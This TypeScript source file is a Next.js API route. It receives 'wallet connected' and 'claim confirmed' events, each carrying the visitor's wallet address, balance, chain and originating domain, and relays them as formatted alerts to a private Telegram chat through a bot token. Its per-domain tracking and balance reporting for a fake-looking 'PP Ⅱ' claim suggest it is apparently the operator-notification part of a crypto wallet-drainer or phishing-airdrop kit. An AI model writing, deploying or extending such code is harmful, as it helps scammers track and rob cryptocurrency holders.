import { NextResponse } from 'next/server'

type TelegramPayload = {
  event: 'wallet_connected' | 'claim_confirmed'
  wallet?: string
  chain?: string
  balance?: string
  asset?: string
  amount?: string
  domain?: string
  txHash?: string
}

function escapeHtml(value: string) {
  return value
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
}

function buildMessage(payload: TelegramPayload) {
  const domain = payload.domain || 'Unknown domain'
  const chain = payload.chain || 'Ethereum'
  const asset = payload.asset || 'ETH'
  const wallet = payload.wallet || 'Unknown wallet'
  const balance = payload.balance || 'Unknown balance'

  if (payload.event === 'wallet_connected') {
    return `
🟢 <b>New Wallet Connected</b>

🌐 <b>Domain:</b> ${escapeHtml(domain)}
⛓️ <b>Blockchain:</b> ${escapeHtml(chain)}
👛 <b>Wallet:</b> <code>${escapeHtml(wallet)}</code>
💰 <b>Balance:</b> ${escapeHtml(balance)} ${escapeHtml(asset)}

🕒 <b>Status:</b> Wallet connected
`.trim()
  }

  return `
✅ <b>Claim Confirmed</b>

🌐 <b>Domain:</b> ${escapeHtml(domain)}
⛓️ <b>Blockchain:</b> ${escapeHtml(chain)}
👛 <b>Wallet:</b> <code>${escapeHtml(wallet)}</code>
🎁 <b>Amount:</b> ${escapeHtml(payload.amount || 'Unknown amount')} PP Ⅱ
${payload.txHash ? `🔗 <b>TX:</b> <code>${escapeHtml(payload.txHash)}</code>` : ''}

🕒 <b>Status:</b> Validation confirmed
`.trim()
}

export async function POST(request: Request) {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!token || !chatId) {
      return NextResponse.json(
        { error: 'Missing Telegram env variables' },
        { status: 500 }
      )
    }

    const payload = (await request.json()) as TelegramPayload
    const text = buildMessage(payload)

    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      }
    )

    if (!response.ok) {
      const error = await response.text()
      return NextResponse.json({ error }, { status: 500 })
    }

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.error(error)
    return NextResponse.json({ error: 'Telegram send failed' }, { status: 500 })
  }
}